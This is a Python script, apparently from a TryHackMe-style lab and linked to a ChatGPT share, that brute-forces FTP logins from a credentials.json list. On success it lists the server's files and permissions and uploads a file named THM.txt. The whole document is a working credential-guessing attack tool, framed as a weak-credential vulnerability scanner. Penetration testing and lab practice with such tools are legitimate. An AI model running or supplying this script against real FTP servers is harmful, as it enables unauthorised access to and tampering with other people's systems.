import ftplib
import json
import socket
from io import BytesIO

def is_ftp_port_open(ip, port=21):
    """Check if the FTP port is open before login attempts."""
    try:
        with socket.create_connection((ip, port), timeout=3):
            print("FTP port is open and responding")
            return True
    except Exception as e:
        print("FTP port check failed:", str(e))
        return False

def list_files_and_permissions(ftp):
    """List files with permissions using FTP 'LIST' command."""
    try:
        print("\n[INFO] Listing files and permissions:")
        ftp.dir()  # Shows file names and permissions
    except Exception as e:
        print(f"[ERROR] Could not list files: {e}")

def create_file_thm(ftp):
    """Try to create a new file named 'THM.txt'."""
    try:
        content = BytesIO(b"This is a test file created by FTP scanner.\n")
        ftp.storbinary("STOR THM.txt", content)
        print("[INFO] Successfully created file: THM.txt")
    except Exception as e:
        print(f"[ERROR] Failed to create THM.txt: {e}")

def check_ftp_vulnerability(ip, port):
    if not is_ftp_port_open(ip, port):
        print("Port is not open or does not support FTP")
        return False

    try:
        with open("credentials.json", "r") as file:
            credentials = json.load(file)
    except Exception as e:
        print("Error loading credentials file:", str(e))
        return False

    print(f"\n[SCAN] Target: ftp://{ip}:{port} - Starting credential brute-force...\n")

    for entry in credentials:
        username = entry.get("username")
        password = entry.get("password")

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(user=username, passwd=password)
            print(f"[SUCCESS] Logged in with: {username} / {password}")
            print(f"[VULNERABLE] FTP on {ip}:{port} allows weak credentials!\n")

            # List files and permissions
            list_files_and_permissions(ftp)

            # Attempt to create a new file
            create_file_thm(ftp)

            ftp.quit()
            return True  # Stop after first success (or remove to test all)
        except ftplib.error_perm:
            continue
        except Exception as e:
            continue

    print("\n[SECURE] FTP (port 21) is not vulnerable to default credentials.\n")
    return False

if __name__ == "__main__":
    target_ip = input("Enter target IP: ").strip()
    target_port = input("Enter port (default 21): ").strip()
    port = int(target_port) if target_port else 21
    check_ftp_vulnerability(target_ip, port)


# https://chatgpt.com/share/684844d3-a8dc-8000-8721-95de7427fa27